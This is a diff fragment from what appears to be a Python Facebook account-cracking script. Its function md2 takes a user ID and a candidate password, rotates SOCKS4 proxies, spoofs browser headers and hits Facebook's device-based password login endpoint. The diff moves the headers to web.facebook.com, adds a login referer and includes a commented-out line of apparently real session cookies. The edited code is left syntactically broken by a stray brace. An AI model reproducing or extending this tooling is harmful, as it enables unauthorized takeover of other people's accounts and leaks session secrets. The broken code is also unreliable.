@@ -592,24 +592,25 @@ def md2(idf,pwv):
       open('http.txt','w').write(proxs)
       nip = rc(proxs)
       proxs = {'http': 'socks4://'+nip}
-      ses.headers.update({'authority':'mbasic.facebook.com',
+      ses.headers.update({
+    'authority': 'web.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'fr-FR,fr;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
+    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    'dpr': '3',
-    'sec-ch-prefers-color-scheme': 'dark',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'datr=tOCHZi_Bif1-ZBExAIAvsEG0; sb=tOCHZpk5UxwhcnEsbLUUW8KE; m_pixel_ratio=2; usida=eyJ2ZXIiOjEsImlkIjoiQXNnNWc2ZTFoY3FzOGMiLCJ0aW1lIjoxNzIwMTgxMDI4fQ%3D%3D; ps_n=1; ps_l=1; dpr=2.1988937854766846; sfiu=AYhC4GseI5zlwsvA8QSoF-H9Fcm8PlvVLW0wTKQAhTa4qH8N8TQXCEkeE4CfM7OWV_tAUVMSKzMEg9QsbVF2adkpxoDPEHGatylYewPpE4f7UlDeXR1NAztjldwFb_s5rmQKq-6A_-8Udwjoih6EjR3YLvbICP96JzG17ijtHYf0kHkW1mi5NT98al-p5f_70NzWTTBi8Az6v4YNoaKJCdteeW3bmnZ2CZpLdS-BlBTOV_nuxjhFFaydBRlCmu8KR4zigZThcKDFRkfoxmD9NXNS; fr=0IpxT6A9Y9GHrN1Kv..Bmh-C0..AAA.0.0.Bmh-Us.AWXcmOASINc; wd=891x691',
+    'origin': 'https://web.facebook.com',
+    'referer': f'https://web.facebook.com/login/web/?email={idf}&is_from_lara=1',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";                 v="99.0.0.0", "Chromium";v="25.0.1364.160"',
     'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
     'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.22 (KHTML, like Gecko) Ubuntu Chromium/25.0.1364.160 Chrome/25.0.1364.160 Safari/537.22',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+}
     'viewport-width': '980',
 })
       p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
